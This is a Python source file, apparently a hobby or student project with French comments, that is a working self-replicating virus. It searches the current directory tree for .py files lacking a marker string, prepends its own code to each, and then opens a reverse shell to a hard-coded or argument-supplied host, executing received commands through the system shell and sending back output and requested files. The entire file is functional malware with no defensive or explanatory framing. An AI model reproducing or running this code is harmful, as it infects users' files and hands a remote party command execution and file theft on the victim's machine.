import os, datetime, inspect, time
DATA_TO_INSERT = "ELIOTT_TESSIER"
def search(path): #search for target files in path 
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
        if os.path.isdir(path+"/"+filename): #If it is a folder 
            filestoinfect.extend(search(path+"/"+filename)) 
        elif filename[-3:] == ".py": #If it is a python script -> Infect it 
            infected = False #default value 
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                 filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
def infect(filestoinfect): #changes to be made in the target file 
    k = 0
    target_file = inspect.currentframe().f_code.co_filename #path vers le fichier py
    virus = open(os.path.abspath(target_file)) # lecture du contenue du virus
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: # nb ligne du virus
            virusstring += line # stockage contenue du virus (meme si pas le code originel)
    virus.close 
    for fname in filestoinfect: #récupération du code originelle du .py infecté
         f = open(fname) 
         temp = f.read() 
         f.close() 
         f = open(fname,"w") 
         f.write(virusstring + temp) #réecriture du fichier avec le virus en entête
         f.close() 
         k += 1
    return k
def sus(): #Not required actually... 
      #if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1: 
    try:
        import socket, subprocess as sp,sys, os, locale
    except:
        pass
    locenc = locale.getpreferredencoding()
    try :
        host = sys.argv[1]
    except :
        host='172.28.128.1'   
    try: 
        port= int(sys.argv[2])
    except:
        port=8080
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((host,port))
    while True:
        command = conn.recv(1024).decode("utf-8")
        if command != "exit":
            if command.startswith("dl") :
                file_path = command.split("#")[1]
                with open(file_path,"rb") as file :
                    data = file.read()
                    conn.sendall(data)
            elif command.startswith('cd') :
                try:
                    os.chdir(command.split(' ')[1])
                except Exception as e :
                    pass #print(e)
            else :
                sh = sp.Popen(command, shell=True,
                              stdout=sp.PIPE,
                              stderr=sp.PIPE,
                              stdin=sp.PIPE)
                out, err = sh.communicate()
                result = out.decode(locenc) + err.decode(locenc)
                conn.sendall(bytes(result,encoding='utf-8'))
        else :
            break
    conn.close()
filestoinfect = search(os.path.abspath("")) 
Infectnb = infect(filestoinfect)
sus()
print (Infectnb)
